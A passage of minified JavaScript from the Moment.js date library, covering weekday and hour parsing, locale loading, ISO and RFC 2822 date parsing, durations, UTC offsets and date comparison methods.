t, e, n) } if (!this._weekdaysParse) { this._weekdaysParse = []; this._minWeekdaysParse = []; this._shortWeekdaysParse = []; this._fullWeekdaysParse = [] } for (i = 0; i < 7; i++) { o = d([2e3, 1]).day(i); if (n && !this._fullWeekdaysParse[i]) { this._fullWeekdaysParse[i] = new RegExp("^" + this.weekdays(o, "").replace(".", "\\.?") + "$", "i"); this._shortWeekdaysParse[i] = new RegExp("^" + this.weekdaysShort(o, "").replace(".", "\\.?") + "$", "i"); this._minWeekdaysParse[i] = new RegExp("^" + this.weekdaysMin(o, "").replace(".", "\\.?") + "$", "i") } if (!this._weekdaysParse[i]) { a = "^" + this.weekdays(o, "") + "|^" + this.weekdaysShort(o, "") + "|^" + this.weekdaysMin(o, ""); this._weekdaysParse[i] = new RegExp(a.replace(".", ""), "i") } if (n && e === "dddd" && this._fullWeekdaysParse[i].test(t)) { return i } else if (n && e === "ddd" && this._shortWeekdaysParse[i].test(t)) { return i } else if (n && e === "dd" && this._minWeekdaysParse[i].test(t)) { return i } else if (!n && this._weekdaysParse[i].test(t)) { return i } } } function Ye(t) { if (!this.isValid()) { return t != null ? this : NaN } var e = this._isUTC ? this._d.getUTCDay() : this._d.getDay(); if (t != null) { t = Se(t, this.localeData()); return this.add(t - e, "d") } else { return e } } function Oe(t) { if (!this.isValid()) { return t != null ? this : NaN } var e = (this.day() + 7 - this.localeData()._week.dow) % 7; return t == null ? e : this.add(t - e, "d") } function _e(t) { if (!this.isValid()) { return t != null ? this : NaN } if (t != null) { var e = ke(t, this.localeData()); return this.day(this.day() % 7 ? e : e - 7) } else { return this.day() || 7 } } var Ve = Qt; function Le(t) { if (this._weekdaysParseExact) { if (!u(this, "_weekdaysRegex")) { je.call(this) } if (t) { return this._weekdaysStrictRegex } else { return this._weekdaysRegex } } else { if (!u(this, "_weekdaysRegex")) { this._weekdaysRegex = Ve } return this._weekdaysStrictRegex && t ? this._weekdaysStrictRegex : this._weekdaysRegex } } var Me = Qt; function ze(t) { if (this._weekdaysParseExact) { if (!u(this, "_weekdaysRegex")) { je.call(this) } if (t) { return this._weekdaysShortStrictRegex } else { return this._weekdaysShortRegex } } else { if (!u(this, "_weekdaysShortRegex")) { this._weekdaysShortRegex = Me } return this._weekdaysShortStrictRegex && t ? this._weekdaysShortStrictRegex : this._weekdaysShortRegex } } var Pe = Qt, Ke; function Je(t) { if (this._weekdaysParseExact) { if (!u(this, "_weekdaysRegex")) { je.call(this) } if (t) { return this._weekdaysMinStrictRegex } else { return this._weekdaysMinRegex } } else { if (!u(this, "_weekdaysMinRegex")) { this._weekdaysMinRegex = Pe } return this._weekdaysMinStrictRegex && t ? this._weekdaysMinStrictRegex : this._weekdaysMinRegex } } function je() { function t(t, e) { return e.length - t.length } var e = [], n = [], i = [], o = [], a, s, r, g, l; for (a = 0; a < 7; a++) { s = d([2e3, 1]).day(a); r = this.weekdaysMin(s, ""); g = this.weekdaysShort(s, ""); l = this.weekdays(s, ""); e.push(r); n.push(g); i.push(l); o.push(r); o.push(g); o.push(l) } e.sort(t); n.sort(t); i.sort(t); o.sort(t); for (a = 0; a < 7; a++) { n[a] = kt(n[a]); i[a] = kt(i[a]); o[a] = kt(o[a]) } this._weekdaysRegex = new RegExp("^(" + o.join("|") + ")", "i"); this._weekdaysShortRegex = this._weekdaysRegex; this._weekdaysMinRegex = this._weekdaysRegex; this._weekdaysStrictRegex = new RegExp("^(" + i.join("|") + ")", "i"); this._weekdaysShortStrictRegex = new RegExp("^(" + n.join("|") + ")", "i"); this._weekdaysMinStrictRegex = new RegExp("^(" + e.join("|") + ")", "i") } function $e() { return this.hours() % 12 || 12 } function qe() { return this.hours() || 24 } function tn(t, e) { at(t, 0, 0, function () { return this.localeData().meridiem(this.hours(), this.minutes(), e) }) } function en(t, e) { return e._meridiemParse } function nn(t) { return (t + "").toLowerCase().charAt(0) === "p" } function on(t, e, n) { if (t > 11) { return n ? "pm" : "PM" } else { return n ? "am" : "AM" } } at("H", ["HH", 2], 0, "hour"), at("h", ["hh", 2], 0, $e), at("k", ["kk", 2], 0, qe), at("hmm", 0, 0, function () { return "" + $e.apply(this) + tt(this.minutes(), 2) }), at("hmmss", 0, 0, function () { return "" + $e.apply(this) + tt(this.minutes(), 2) + tt(this.seconds(), 2) }), at("Hmm", 0, 0, function () { return "" + this.hours() + tt(this.minutes(), 2) }), at("Hmmss", 0, 0, function () { return "" + this.hours() + tt(this.minutes(), 2) + tt(this.seconds(), 2) }), tn("a", true), tn("A", false), P("hour", "h"), $("hour", 13), wt("a", en), wt("A", en), wt("H", Ct), wt("h", Ct), wt("k", Ct), wt("HH", Ct, It), wt("hh", Ct, It), wt("kk", Ct, It), wt("hmm", At), wt("hmmss", pt), wt("Hmm", At), wt("Hmmss", pt), Zt(["H", "HH"], Et), Zt(["k", "kk"], function (t, e, n) { var i = x(t); e[Et] = i === 24 ? 0 : i }), Zt(["a", "A"], function (t, e, n) { n._isPm = n._locale.isPM(t); n._meridiem = t }), Zt(["h", "hh"], function (t, e, n) { e[Et] = x(t); C(n).bigHour = true }), Zt("hmm", function (t, e, n) { var i = t.length - 2; e[Et] = x(t.substr(0, i)); e[Rt] = x(t.substr(i)); C(n).bigHour = true }), Zt("hmmss", function (t, e, n) { var i = t.length - 4; var o = t.length - 2; e[Et] = x(t.substr(0, i)); e[Rt] = x(t.substr(i, 2)); e[Yt] = x(t.substr(o)); C(n).bigHour = true }), Zt("Hmm", function (t, e, n) { var i = t.length - 2; e[Et] = x(t.substr(0, i)); e[Rt] = x(t.substr(i)) }), Zt("Hmmss", function (t, e, n) { var i = t.length - 4; var o = t.length - 2; e[Et] = x(t.substr(0, i)); e[Rt] = x(t.substr(i, 2)); e[Yt] = x(t.substr(o)) }); var an = Jt("Hours", true), sn = { calendar: W, longDateFormat: T, invalidDate: E, ordinal: Y, dayOfMonthOrdinalParse: O, relativeTime: V, months: oe, monthsShort: se, week: Fe, weekdays: Ze, weekdaysMin: Te, weekdaysShort: We, meridiemParse: /[ap]\.?m?\.?/i }, rn = {}, gn = {}, ln; function cn(t) { return t ? t.toLowerCase().replace("_", "-") : t } function In(t) { var e = 0, n, i, o, a; while (e < t.length) { a = cn(t[e]).split("-"); n = a.length; i = cn(t[e + 1]); i = i ? i.split("-") : null; while (n > 0) { o = un(a.slice(0, n).join("-")); if (o) { return o } if (i && i.length >= n && F(a, i, true) >= n - 1) { break } n-- } e++ } return ln } function un(t) { var e = null; if (!rn[t] && "object" !== "undefined" && Ra && Ra.exports) { try { e = ln._abbr; var n = Ya; n("./locale/" + t); hn(e) } catch (t) { } } return rn[t] } function hn(t, e) { var n; if (t) { if (a(e)) { n = An(t) } else { n = dn(t, e) } if (n) { ln = n } else { if (typeof console !== "undefined" && console.warn) { console.warn("Locale " + t + " not found. Did you forget to load it?") } } } return ln._abbr } function dn(t, e) { if (e !== null) { var n, i = sn; e.abbr = t; if (rn[t] != null) { S("defineLocaleOverride", "use moment.updateLocale(localeName, config) to change " + "an existing locale. moment.defineLocale(localeName, " + "config) should only be used for creating a new locale " + "See https://momentjs.com/guides/#/warnings/define-locale/ for more info."); i = rn[t]._config } else if (e.parentLocale != null) { if (rn[e.parentLocale] != null) { i = rn[e.parentLocale]._config } else { n = un(e.parentLocale); if (n != null) { i = n._config } else { if (!gn[e.parentLocale]) { gn[e.parentLocale] = [] } gn[e.parentLocale].push({ name: t, config: e }); return null } } } rn[t] = new U(Z(i, e)); if (gn[t]) { gn[t].forEach(function (t) { dn(t.name, t.config) }) } hn(t); return rn[t] } else { delete rn[t]; return null } } function Cn(t, e) { if (null != e) { var n, i, o = sn; null != (i = un(t)) && (o = i._config), e = Z(o, e), (n = new U(e)).parentLocale = rn[t], rn[t] = n, hn(t) } else null != rn[t] && (null != rn[t].parentLocale ? rn[t] = rn[t].parentLocale : null != rn[t] && delete rn[t]); return rn[t] } function An(t) { var e; if (t && t._locale && t._locale._abbr) { t = t._locale._abbr } if (!t) { return ln } if (!s(t)) { e = un(t); if (e) { return e } t = [t] } return In(t) } function pn() { return X(rn) } function mn(t) { var e; var n = t._a; if (n && C(t).overflow === -2) { e = n[Tt] < 0 || n[Tt] > 11 ? Tt : n[Ht] < 1 || n[Ht] > ne(n[Nt], n[Tt]) ? Ht : n[Et] < 0 || n[Et] > 24 || n[Et] === 24 && (n[Rt] !== 0 || n[Yt] !== 0 || n[Ot] !== 0) ? Et : n[Rt] < 0 || n[Rt] > 59 ? Rt : n[Yt] < 0 || n[Yt] > 59 ? Yt : n[Ot] < 0 || n[Ot] > 999 ? Ot : -1; if (C(t)._overflowDayOfYear && (e < Nt || e > Ht)) { e = Ht } if (C(t)._overflowWeeks && e === -1) { e = _t } if (C(t)._overflowWeekday && e === -1) { e = Vt } C(t).overflow = e } return t } function fn(t, e, n) { if (t != null) { return t } if (e != null) { return e } return n } function bn(t) { var e = new Date(l.now()); if (t._useUTC) { return [e.getUTCFullYear(), e.getUTCMonth(), e.getUTCDate()] } return [e.getFullYear(), e.getMonth(), e.getDate()] } function Bn(t) { var e, n, i = [], o, a, s; if (t._d) { return } o = bn(t); if (t._w && t._a[Ht] == null && t._a[Tt] == null) { yn(t) } if (t._dayOfYear != null) { s = fn(t._a[Nt], o[Nt]); if (t._dayOfYear > Lt(s) || t._dayOfYear === 0) { C(t)._overflowDayOfYear = true } n = fe(s, 0, t._dayOfYear); t._a[Tt] = n.getUTCMonth(); t._a[Ht] = n.getUTCDate() } for (e = 0; e < 3 && t._a[e] == null; ++e) { t._a[e] = i[e] = o[e] } for (; e < 7; e++) { t._a[e] = i[e] = t._a[e] == null ? e === 2 ? 1 : 0 : t._a[e] } if (t._a[Et] === 24 && t._a[Rt] === 0 && t._a[Yt] === 0 && t._a[Ot] === 0) { t._nextDay = true; t._a[Et] = 0 } t._d = (t._useUTC ? fe : me).apply(null, i); a = t._useUTC ? t._d.getUTCDay() : t._d.getDay(); if (t._tzm != null) { t._d.setUTCMinutes(t._d.getUTCMinutes() - t._tzm) } if (t._nextDay) { t._a[Et] = 24 } if (t._w && typeof t._w.d !== "undefined" && t._w.d !== a) { C(t).weekdayMismatch = true } } function yn(t) { var e, n, i, o, a, s, r, g; e = t._w; if (e.GG != null || e.W != null || e.E != null) { a = 1; s = 4; n = fn(e.GG, t._a[Nt], ye(zn(), 1, 4).year); i = fn(e.W, 1); o = fn(e.E, 1); if (o < 1 || o > 7) { g = true } } else { a = t._locale._week.dow; s = t._locale._week.doy; var l = ye(zn(), a, s); n = fn(e.gg, t._a[Nt], l.year); i = fn(e.w, l.week); if (e.d != null) { o = e.d; if (o < 0 || o > 6) { g = true } } else if (e.e != null) { o = e.e + a; if (e.e < 0 || e.e > 6) { g = true } } else { o = a } } if (i < 1 || i > ve(n, a, s)) { C(t)._overflowWeeks = true } else if (g != null) { C(t)._overflowWeekday = true } else { r = Be(n, i, o, a, s); t._a[Nt] = r.year; t._dayOfYear = r.dayOfYear } } var vn = /^\s*((?:[+-]\d{6}|\d{4})-(?:\d\d-\d\d|W\d\d-\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?::\d\d(?::\d\d(?:[.,]\d+)?)?)?)([\+\-]\d\d(?::?\d\d)?|\s*Z)?)?$/, xn = /^\s*((?:[+-]\d{6}|\d{4})(?:\d\d\d\d|W\d\d\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?:\d\d(?:\d\d(?:[.,]\d+)?)?)?)([\+\-]\d\d(?::?\d\d)?|\s*Z)?)?$/, Fn = /Z|[+-]\d\d(?::?\d\d)?/, Qn = [["YYYYYY-MM-DD", /[+-]\d{6}-\d\d-\d\d/], ["YYYY-MM-DD", /\d{4}-\d\d-\d\d/], ["GGGG-[W]WW-E", /\d{4}-W\d\d-\d/], ["GGGG-[W]WW", /\d{4}-W\d\d/, false], ["YYYY-DDD", /\d{4}-\d{3}/], ["YYYY-MM", /\d{4}-\d\d/, false], ["YYYYYYMMDD", /[+-]\d{10}/], ["YYYYMMDD", /\d{8}/], ["GGGG[W]WWE", /\d{4}W\d{3}/], ["GGGG[W]WW", /\d{4}W\d{2}/, false], ["YYYYDDD", /\d{7}/]], Gn = [["HH:mm:ss.SSSS", /\d\d:\d\d:\d\d\.\d+/], ["HH:mm:ss,SSSS", /\d\d:\d\d:\d\d,\d+/], ["HH:mm:ss", /\d\d:\d\d:\d\d/], ["HH:mm", /\d\d:\d\d/], ["HHmmss.SSSS", /\d\d\d\d\d\d\.\d+/], ["HHmmss,SSSS", /\d\d\d\d\d\d,\d+/], ["HHmmss", /\d\d\d\d\d\d/], ["HHmm", /\d\d\d\d/], ["HH", /\d\d/]], wn = /^\/?Date\((\-?\d+)/i; function Xn(t) { var e, n, i = t._i, o = vn.exec(i) || xn.exec(i), a, s, r, g; if (o) { C(t).iso = true; for (e = 0, n = Qn.length; e < n; e++) { if (Qn[e][1].exec(o[1])) { s = Qn[e][0]; a = Qn[e][2] !== false; break } } if (s == null) { t._isValid = false; return } if (o[3]) { for (e = 0, n = Gn.length; e < n; e++) { if (Gn[e][1].exec(o[3])) { r = (o[2] || " ") + Gn[e][0]; break } } if (r == null) { t._isValid = false; return } } if (!a && r != null) { t._isValid = false; return } if (o[4]) { if (Fn.exec(o[4])) { g = "Z" } else { t._isValid = false; return } } t._f = s + (r || "") + (g || ""); En(t) } else { t._isValid = false } } var Sn = /^(?:(Mon|Tue|Wed|Thu|Fri|Sat|Sun),?\s)?(\d{1,2})\s(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s(\d{2,4})\s(\d\d):(\d\d)(?::(\d\d))?\s(?:(UT|GMT|[ECMP][SD]T)|([Zz])|([+-]\d{4}))$/; function kn(t, e, n, i, o, a) { var s = [Dn(t), se.indexOf(e), parseInt(n, 10), parseInt(i, 10), parseInt(o, 10)]; if (a) { s.push(parseInt(a, 10)) } return s } function Dn(t) { var e = parseInt(t, 10); if (e <= 49) { return 2e3 + e } else if (e <= 999) { return 1900 + e } return e } function Zn(t) { return t.replace(/\([^)]*\)|[\n\t]/g, " ").replace(/(\s\s+)/g, " ").replace(/^\s\s*/, "").replace(/\s\s*$/, "") } function Un(t, e, n) { if (t) { var i = We.indexOf(t), o = new Date(e[0], e[1], e[2]).getDay(); if (i !== o) { C(n).weekdayMismatch = true; n._isValid = false; return false } } return true } var Wn = { UT: 0, GMT: 0, EDT: -4 * 60, EST: -5 * 60, CDT: -5 * 60, CST: -6 * 60, MDT: -6 * 60, MST: -7 * 60, PDT: -7 * 60, PST: -8 * 60 }; function Nn(t, e, n) { if (t) { return Wn[t] } else if (e) { return 0 } else { var i = parseInt(n, 10); var o = i % 100, a = (i - o) / 100; return a * 60 + o } } function Tn(t) { var e = Sn.exec(Zn(t._i)); if (e) { var n = kn(e[4], e[3], e[2], e[5], e[6], e[7]); if (!Un(e[1], n, t)) { return } t._a = n; t._tzm = Nn(e[8], e[9], e[10]); t._d = fe.apply(null, t._a); t._d.setUTCMinutes(t._d.getUTCMinutes() - t._tzm); C(t).rfc2822 = true } else { t._isValid = false } } function Hn(t) { var e = wn.exec(t._i); if (e !== null) { t._d = new Date(+e[1]); return } Xn(t); if (t._isValid === false) { delete t._isValid } else { return } Tn(t); if (t._isValid === false) { delete t._isValid } else { return } l.createFromInputFallback(t) } function En(t) { if (t._f === l.ISO_8601) { Xn(t); return } if (t._f === l.RFC_2822) { Tn(t); return } t._a = []; C(t).empty = true; var e = "" + t._i, n, i, o, a, s, r = e.length, g = 0; o = lt(t._f, t._locale).match(et) || []; for (n = 0; n < o.length; n++) { a = o[n]; i = (e.match(Xt(a, t)) || [])[0]; if (i) { s = e.substr(0, e.indexOf(i)); if (s.length > 0) { C(t).unusedInput.push(s) } e = e.slice(e.indexOf(i) + i.length); g += i.length } if (ot[a]) { if (i) { C(t).empty = false } else { C(t).unusedTokens.push(a) } Wt(a, i, t) } else if (t._strict && !i) { C(t).unusedTokens.push(a) } } C(t).charsLeftOver = r - g; if (e.length > 0) { C(t).unusedInput.push(e) } if (t._a[Et] <= 12 && C(t).bigHour === true && t._a[Et] > 0) { C(t).bigHour = undefined } C(t).parsedDateParts = t._a.slice(0); C(t).meridiem = t._meridiem; t._a[Et] = Rn(t._locale, t._a[Et], t._meridiem); Bn(t); mn(t) } function Rn(t, e, n) { var i; if (n == null) { return e } if (t.meridiemHour != null) { return t.meridiemHour(e, n) } else if (t.isPM != null) { i = t.isPM(n); if (i && e < 12) { e += 12 } if (!i && e === 12) { e = 0 } return e } else { return e } } function Yn(t) { var e, n, i, o, a; if (t._f.length === 0) { C(t).invalidFormat = true; t._d = new Date(NaN); return } for (o = 0; o < t._f.length; o++) { a = 0; e = f({}, t); if (t._useUTC != null) { e._useUTC = t._useUTC } e._f = t._f[o]; En(e); if (!A(e)) { continue } a += C(e).charsLeftOver; a += C(e).unusedTokens.length * 10; C(e).score = a; if (i == null || a < i) { i = a; n = e } } h(t, n || e) } function On(t) { if (t._d) { return } var e = J(t._i); t._a = n([e.year, e.month, e.day || e.date, e.hour, e.minute, e.second, e.millisecond], function (t) { return t && parseInt(t, 10) }); Bn(t) } function _n(t) { var e = new B(mn(Vn(t))); if (e._nextDay) { e.add(1, "d"); e._nextDay = undefined } return e } function Vn(t) { var e = t._i, n = t._f; t._locale = t._locale || An(t._l); if (e === null || n === undefined && e === "") { return p({ nullInput: true }) } if (typeof e === "string") { t._i = e = t._locale.preparse(e) } if (y(e)) { return new B(mn(e)) } else if (I(e)) { t._d = e } else if (s(n)) { Yn(t) } else if (n) { En(t) } else { Ln(t) } if (!A(t)) { t._d = null } return t } function Ln(t) { var e = t._i; if (a(e)) { t._d = new Date(l.now()) } else if (I(e)) { t._d = new Date(e.valueOf()) } else if (typeof e === "string") { Hn(t) } else if (s(e)) { t._a = n(e.slice(0), function (t) { return parseInt(t, 10) }); Bn(t) } else if (r(e)) { On(t) } else if (c(e)) { t._d = new Date(e) } else { l.createFromInputFallback(t) } } function Mn(t, e, n, i, o) { var a = {}; if (n === true || n === false) { i = n; n = undefined } if (r(t) && g(t) || s(t) && t.length === 0) { t = undefined } a._isAMomentObject = true; a._useUTC = a._isUTC = o; a._l = n; a._i = t; a._f = e; a._strict = i; return _n(a) } function zn(t, e, n, i) { return Mn(t, e, n, i, false) } l.createFromInputFallback = G("value provided is not in a recognized RFC2822 or ISO format. moment construction falls back to js Date(), " + "which is not reliable across all browsers and versions. Non RFC2822/ISO date formats are " + "discouraged and will be removed in an upcoming major release. Please refer to " + "https://momentjs.com/guides/#/warnings/js-date/ for more info.", function (t) { t._d = new Date(t._i + (t._useUTC ? " UTC" : "")) }), l.ISO_8601 = function () { }, l.RFC_2822 = function () { }; var Pn = G("moment().min is deprecated, use moment.max instead. https://momentjs.com/guides/#/warnings/min-max/", function () { var t = zn.apply(null, arguments); if (this.isValid() && t.isValid()) { return t < this ? this : t } else { return p() } }), Kn = G("moment().max is deprecated, use moment.min instead. https://momentjs.com/guides/#/warnings/min-max/", function () { var t = zn.apply(null, arguments); if (this.isValid() && t.isValid()) { return t > this ? this : t } else { return p() } }); function Jn(t, e) { var n, i; if (e.length === 1 && s(e[0])) { e = e[0] } if (!e.length) { return zn() } n = e[0]; for (i = 1; i < e.length; ++i) { if (!e[i].isValid() || e[i][t](n)) { n = e[i] } } return n } function jn() { var t; return Jn("isBefore", [].slice.call(arguments, 0)) } function $n() { var t; return Jn("isAfter", [].slice.call(arguments, 0)) } var qn = function () { return Date.now ? Date.now() : +new Date }, ti = ["year", "quarter", "month", "week", "day", "hour", "minute", "second", "millisecond"]; function ei(t) { for (var e in t) { if (!(Pt.call(ti, e) !== -1 && (t[e] == null || !isNaN(t[e])))) { return false } } var n = false; for (var i = 0; i < ti.length; ++i) { if (t[ti[i]]) { if (n) { return false } if (parseFloat(t[ti[i]]) !== x(t[ti[i]])) { n = true } } } return true } function ni() { return this._isValid } function ii() { return Fi(NaN) } function oi(t) { var e = J(t), n = e.year || 0, i = e.quarter || 0, o = e.month || 0, a = e.week || e.isoWeek || 0, s = e.day || 0, r = e.hour || 0, g = e.minute || 0, l = e.second || 0, c = e.millisecond || 0; this._isValid = ei(e); this._milliseconds = +c + l * 1e3 + g * 6e4 + r * 1e3 * 60 * 60; this._days = +s + a * 7; this._months = +o + i * 3 + n * 12; this._data = {}; this._locale = An(); this._bubble() } function ai(t) { return t instanceof oi } function si(t) { if (t < 0) { return Math.round(-1 * t) * -1 } else { return Math.round(t) } } function ri(t, n) { at(t, 0, 0, function () { var t = this.utcOffset(); var e = "+"; if (t < 0) { t = -t; e = "-" } return e + tt(~~(t / 60), 2) + n + tt(~~t % 60, 2) }) } ri("Z", ":"), ri("ZZ", ""), wt("Z", xt), wt("ZZ", xt), Zt(["Z", "ZZ"], function (t, e, n) { n._useUTC = true; n._tzm = li(xt, t) }); var gi = /([\+\-]|\d\d)/gi; function li(t, e) { var n = (e || "").match(t); if (n === null) { return null } var i = n[n.length - 1] || []; var o = (i + "").match(gi) || ["-", 0, 0]; var a = +(o[1] * 60) + x(o[2]); return a === 0 ? 0 : o[0] === "+" ? a : -a } function ci(t, e) { var n, i; if (e._isUTC) { n = e.clone(); i = (y(t) || I(t) ? t.valueOf() : zn(t).valueOf()) - n.valueOf(); n._d.setTime(n._d.valueOf() + i); l.updateOffset(n, false); return n } else { return zn(t).local() } } function Ii(t) { return -Math.round(t._d.getTimezoneOffset() / 15) * 15 } function ui(t, e, n) { var i = this._offset || 0, o; if (!this.isValid()) { return t != null ? this : NaN } if (t != null) { if (typeof t === "string") { t = li(xt, t); if (t === null) { return this } } else if (Math.abs(t) < 16 && !n) { t = t * 60 } if (!this._isUTC && e) { o = Ii(this) } this._offset = t; this._isUTC = true; if (o != null) { this.add(o, "m") } if (i !== t) { if (!e || this._changeInProgress) { Si(this, Fi(t - i, "m"), 1, false) } else if (!this._changeInProgress) { this._changeInProgress = true; l.updateOffset(this, true); this._changeInProgress = null } } return this } else { return this._isUTC ? i : Ii(this) } } function hi(t, e) { if (t != null) { if (typeof t !== "string") { t = -t } this.utcOffset(t, e); return this } else { return -this.utcOffset() } } function di(t) { return this.utcOffset(0, t) } function Ci(t) { if (this._isUTC) { this.utcOffset(0, t); this._isUTC = false; if (t) { this.subtract(Ii(this), "m") } } return this } function Ai() { if (this._tzm != null) { this.utcOffset(this._tzm, false, true) } else if (typeof this._i === "string") { var t = li(vt, this._i); if (t != null) { this.utcOffset(t) } else { this.utcOffset(0, true) } } return this } function pi(t) { if (!this.isValid()) { return false } t = t ? zn(t).utcOffset() : 0; return (this.utcOffset() - t) % 60 === 0 } function mi() { return this.utcOffset() > this.clone().month(0).utcOffset() || this.utcOffset() > this.clone().month(5).utcOffset() } function fi() { if (!a(this._isDSTShifted)) { return this._isDSTShifted } var t = {}; f(t, this); t = Vn(t); if (t._a) { var e = t._isUTC ? d(t._a) : zn(t._a); this._isDSTShifted = this.isValid() && F(t._a, e.toArray()) > 0 } else { this._isDSTShifted = false } return this._isDSTShifted } function bi() { return this.isValid() ? !this._isUTC : false } function Bi() { return this.isValid() ? this._isUTC : false } function yi() { return this.isValid() ? this._isUTC && this._offset === 0 : false } l.updateOffset = function () { }; var vi = /^(\-|\+)?(?:(\d*)[. ])?(\d+)\:(\d+)(?:\:(\d+)(\.\d*)?)?$/, xi = /^(-|\+)?P(?:([-+]?[0-9,.]*)Y)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)W)?(?:([-+]?[0-9,.]*)D)?(?:T(?:([-+]?[0-9,.]*)H)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)S)?)?$/; function Fi(t, e) { var n = t, i = null, o, a, s; if (ai(t)) { n = { ms: t._milliseconds, d: t._days, M: t._months } } else if (c(t)) { n = {}; if (e) { n[e] = t } else { n.milliseconds = t } } else if (!!(i = vi.exec(t))) { o = i[1] === "-" ? -1 : 1; n = { y: 0, d: x(i[Ht]) * o, h: x(i[Et]) * o, m: x(i[Rt]) * o, s: x(i[Yt]) * o, ms: x(si(i[Ot] * 1e3)) * o } } else if (!!(i = xi.exec(t))) { o = i[1] === "-" ? -1 : 1; n = { y: Qi(i[2], o), M: Qi(i[3], o), w: Qi(i[4], o), d: Qi(i[5], o), h: Qi(i[6], o), m: Qi(i[7], o), s: Qi(i[8], o) } } else if (n == null) { n = {} } else if (typeof n === "object" && ("from" in n || "to" in n)) { s = wi(zn(n.from), zn(n.to)); n = {}; n.ms = s.milliseconds; n.M = s.months } a = new oi(n); if (ai(t) && u(t, "_locale")) { a._locale = t._locale } return a } function Qi(t, e) { var n = t && parseFloat(t.replace(",", ".")); return (isNaN(n) ? 0 : n) * e } function Gi(t, e) { var n = {}; n.months = e.month() - t.month() + (e.year() - t.year()) * 12; if (t.clone().add(n.months, "M").isAfter(e)) { --n.months } n.milliseconds = +e - +t.clone().add(n.months, "M"); return n } function wi(t, e) { var n; if (!(t.isValid() && e.isValid())) { return { milliseconds: 0, months: 0 } } e = ci(e, t); if (t.isBefore(e)) { n = Gi(t, e) } else { n = Gi(e, t); n.milliseconds = -n.milliseconds; n.months = -n.months } return n } function Xi(o, a) { return function (t, e) { var n, i; if (e !== null && !isNaN(+e)) { S(a, "moment()." + a + "(period, number) is deprecated. Please use moment()." + a + "(number, period). " + "See https://momentjs.com/guides/#/warnings/add-inverted-param/ for more info."); i = t; t = e; e = i } t = typeof t === "string" ? +t : t; n = Fi(t, e); Si(this, n, o); return this } } function Si(t, e, n, i) { var o = e._milliseconds, a = si(e._days), s = si(e._months); if (!t.isValid()) { return } i = i == null ? true : i; if (s) { ce(t, jt(t, "Month") + s * n) } if (a) { $t(t, "Date", jt(t, "Date") + a * n) } if (o) { t._d.setTime(t._d.valueOf() + o * n) } if (i) { l.updateOffset(t, a || s) } } Fi.fn = oi.prototype, Fi.invalid = ii; var ki = Xi(1, "add"), Di = Xi(-1, "subtract"); function Zi(t, e) { var n = t.diff(e, "days", !0); return n < -6 ? "sameElse" : n < -1 ? "lastWeek" : n < 0 ? "lastDay" : n < 1 ? "sameDay" : n < 2 ? "nextDay" : n < 7 ? "nextWeek" : "sameElse" } function Ui(t, e) { var n = t || zn(), i = ci(n, this).startOf("day"), o = l.calendarFormat(this, i) || "sameElse"; var a = e && (k(e[o]) ? e[o].call(this, n) : e[o]); return this.format(a || this.localeData().calendar(o, this, zn(n))) } function Wi() { return new B(this) } function Ni(t, e) { var n = y(t) ? t : zn(t); if (!(this.isValid() && n.isValid())) { return false } e = K(e) || "millisecond"; if (e === "millisecond") { return this.valueOf() > n.valueOf() } else { return n.valueOf() < this.clone().startOf(e).valueOf() } } function Ti(t, e) { var n = y(t) ? t : zn(t); if (!(this.isValid() && n.isValid())) { return false } e = K(e) || "millisecond"; if (e === "millisecond") { return this.valueOf() < n.valueOf() } else { return this.clone().endOf(e).valueOf() < n.valueOf() } } function Hi(t, e, n, i) { var o = y(t) ? t : zn(t), a = y(e) ? e : zn(e); if (!(this.isValid() && o.isValid() && a.isValid())) { return false } i = i || "()"; return (i[0] === "(" ? this.isAfter(o, n) : !this.isBefore(o, n)) && (i[1] === ")" ? this.isBefore(a, n) : !this.isAfter(a, n)) } function Ei(t, e) { var n = y(t) ? t : zn(t), i; if (!(this.isValid() && n.isValid())) { return false } e = K(e) || "millisecond"; if (e === "millisecond") { return this.valueOf() === n.valueOf() } else { i = n.valueOf(); return this.clone().startOf(e).valueOf() <= i && i <= this.clone().endOf(e).valueOf() } } function Ri(t, e) { return this.isSame(t, e) || this.isAfter(t, e) } function Yi(t, e) { return this.isSame(t, e) || this.isBefore(t, e) } function Oi(t, e, n) { var i, o, a; if (!this.isValid()) { return NaN } i = ci(t, this); if (!i.isValid()) { return NaN } o = (i.utcOffset() - this.utcOffset()) * 6e4; e = K(e); switch (e) { case "year": a = _i(this, i) / 12; break; case "month": a = _i(this, i); break; case "quarter": a = _i(this, i) / 3; break; case "second": a = (this - i) / 1e3; break; case "minute": a = (this - i) / 6e4; break; case "hour": a = (this - i) / 36e5; break; case "day": a = (this - i - o) / 864e5; break; case "week": a = (this - i - o) / 6048e5; break; default: a = this - i }return n ? a : v(a) } function _i(t, e) { var n = (e.year() - t.year()) * 12 + (e.month() - t.month()), i = t.clone().add(n, "months"), o, a; if (e - i < 0) { o = t.clone().add(n - 1, "months"); a = (e - i) / (i - o) } else { o = t.clone().add(n + 1, "months"); a = (e - i) / (o - i) } return -(n + a) || 0 } function Vi() { return this.clone().locale("en").format("ddd MMM DD YYYY HH:mm:ss [GMT]ZZ") } function Li(t) { if (!this.isValid()) { return null } var e = t !== true; var n = e ? this.clone().utc() : this; if (n.year() < 0 || n.year() > 9999) { return gt(n, e ? "YYYYYY-MM-DD[T]HH:mm:ss.SSS[Z]" : "YYYYYY-MM-DD[T]HH:mm:ss.SSSZ") } if (k(Date.prototype.toISOString)) { if (e) { return this.toDate().toISOString() } else { return new Date(this.valueOf() + this.utcOffset() * 60 * 1e3).toISOString().replace("Z", gt(n, "Z")) } } return gt(n, e ? "YYYY-MM-DD[T]HH:mm:ss.SSS[Z]" : "YYYY-MM-DD[T]HH:mm:ss.SSSZ") } function Mi() { if (!this.isValid()) { return "moment.invalid(/* " + this._i + " */)" } var t = "moment"; var e = ""; if (!this.isLocal()) { t = this.utcOffset() === 0 ? "moment.utc" : "moment.parseZone"; e = "Z" } var n = "[" + t + '("]'; var i = 0 <= this.year() && this.year() <= 9999 ? "YYYY" : "YYYYYY"; var o = "-MM-DD[T]HH:mm:ss.SSS"; var a = e + '[")]'; return this.format(n + i + o + a) } function zi(t) { if (!t) { t = this.isUtc() ? l.defaultFormatUtc : l.defaultFormat } var e = gt(this, t); return this.localeData().postformat(e) } function Pi(t, e) { if 